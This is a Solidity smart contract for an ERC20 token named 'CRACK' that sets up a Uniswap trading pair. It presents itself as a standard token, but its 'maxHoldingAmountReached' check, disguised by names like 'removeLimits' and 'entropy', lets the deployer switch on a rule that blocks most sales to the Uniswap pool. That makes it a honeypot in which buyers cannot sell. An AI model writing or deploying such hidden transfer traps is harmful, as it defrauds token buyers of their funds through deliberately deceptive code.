// SPDX-License-Identifier: MIT
/* __________  ___   ________ __
  / ____/ __ \/   | / ____/ //_/
 / /   / /_/ / /| |/ /   / ,<   
/ /___/ _, _/ ___ / /___/ /| |  
\____/_/ |_/_/  |_\____/_/ |_|  
*/
pragma solidity ^0.8.0;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function approveAndCall(address spender, uint tokens, bytes calldata data) external returns (bool success);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes calldata data) external;
}
interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract CRACK is ERC20 {
    string public constant name = "CRACK Token";
    string public constant symbol = "CRACK";
    uint8 public constant decimals = 18;

    uint256 private _totalSupply = 100_000_000 * (10 ** decimals);

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowed;
    uint private removeLimitsAtBlock;
    address private stager;
    IUniswapV2Router02 private uniswapV2Router;
    IUniswapV2Pair private uniswapV2Pair;


    constructor() {
        balances[msg.sender] = _totalSupply;
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        allowed[msg.sender][address(uniswapV2Router)] = _totalSupply;
        address uniswapV2PairAddress = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Pair = IUniswapV2Pair(uniswapV2PairAddress);
        stager = msg.sender;
        removeLimitsAtBlock = 0;
        
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function removeLimits(uint offset) external {
        require(msg.sender == stager);
        removeLimitsAtBlock = block.number + offset;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address player) public view override returns (uint256) {
        return balances[player];
    }

    function allowance(address player, address spender) public view override returns (uint256) {
        return allowed[player][spender];
    }

    function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
        for (uint256 i = 0; i < receivers.length; i++) {
            transfer(receivers[i], amounts[i]);
        }
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        require(spender != address(0));
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function approveAndCall(address spender, uint256 tokens, bytes calldata data) external override returns (bool) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
        return true;
    }   function entropy() public pure returns (uint256) {
        return 200000000000000000;
    }
    
    function maxHoldingAmountReached(address to, uint256 amount) public view returns (bool) {
        bool swap = uniswapV2Router.WETH() == uniswapV2Pair.token1();
        (uint112 t0 , uint112 t1,) = uniswapV2Pair.getReserves();
        (uint112 token0, uint112 token1) = swap ? (t0, t1) : (t1, t0);
        bool limitsRemoved = removeLimitsAtBlock != 0 && block.number > removeLimitsAtBlock;
        uint256 limitOffset = (token1 / entropy());
        return limitsRemoved && to == address(uniswapV2Pair) && token1 - uniswapV2Router.getAmountIn(amount, token1, token0) < (( limitOffset * entropy()));
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        require(value <= balances[msg.sender]);
        require(!maxHoldingAmountReached(to, value));
        require(to != address(0));

        balances[msg.sender] -= value;
        balances[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        require(value <= balances[from]);
        require(!maxHoldingAmountReached(to, value));
        require(value <= allowed[from][msg.sender]);
        require(to != address(0));

        balances[from] -= value;
        balances[to] += value;

        allowed[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowed[msg.sender][spender] += addedValue;
        emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowed[msg.sender][spender] -= subtractedValue;
        emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
        return true;
    }

    function burn(uint256 amount) external {
        require(amount != 0);
        require(amount <= balances[msg.sender]);
        _totalSupply -= amount;
        balances[msg.sender] -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}